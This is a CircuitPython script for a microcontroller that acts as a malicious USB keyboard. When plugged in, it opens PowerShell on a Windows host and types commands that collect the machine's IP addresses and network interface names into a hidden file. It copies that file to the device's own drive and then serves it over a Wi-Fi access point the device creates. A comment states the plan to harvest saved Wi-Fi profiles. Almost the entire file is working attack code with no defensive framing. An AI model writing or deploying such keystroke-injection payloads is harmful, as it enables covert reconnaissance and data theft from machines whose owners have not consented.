import board
import digitalio
import time
import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
from adafruit_hid.keycode import Keycode # may not be needed

import wifi
import socketpool
from adafruit_httpserver import Server, Request, Response

kbd = Keyboard(usb_hid.devices)
layout = KeyboardLayoutUS(kbd)
kbd = Keyboard(usb_hid.devices)
# windows vs linux checkout
kbd.send(Keycode.WINDOWS,Keycode.R)
time.sleep(0.5)
layout.write('powershell.exe\n')
time.sleep(1)

# TODO Obtain network profiles, netsh wlan show profiles and do something

layout.write('Get-NetIPAddress -AddressFamily IPv4 | Select-Object IPAddress,InterfaceAlias,SuffixOrigin | where IPAddress -notmatch "(127.0.0.1|169.254.\d+.\d+)" > .tmp.txt\n')
time.sleep(0.5)
# extract the profiles of the network
# find device location of CIRCUITPY and move .tmp to CIRCUITPY
# ((Get-Volume | grep "CIRCUITPY") -split "\s+")[0] finds the location device location based on the the device name
layout.write('(Get-Content -Path ".tmp.txt" -Encoding UTF8) | Set-Content -Path ".tmp.txt" -Encoding UTF8\n')
layout.write('Copy-Item -Path ".tmp.txt" -Destination $(((Get-Volume | grep "CIRCUITPY") -split "\s+")[0] + ":\.tmp.txt") -Force\n')
layout.write('exit\n')

ap_ssid = "TEST"
ap_password = "TESTING12"
wifi.radio.start_ap(ssid=ap_ssid,password=ap_password)

# print access point settings
print("Access point created with SSID: {}, password: {}".format(ap_ssid, ap_password))

# print IP address
print("My IP address is", wifi.radio.ipv4_address)
pool = socketpool.SocketPool(wifi.radio)
server = Server(pool, "/static", debug=True)

@server.route("/")
def base(request: Request):
    http = ""
    with open(".tmp.txt", 'r') as file:
        for line in file:
            http += line.strip() + "\n"
    # Serve a default static plain text message.
    #f = open(".tmp.txt", "r")
    #print(f.read())
    return Response(request, http)
server.serve_forever(str(wifi.radio.ipv4_address_ap))
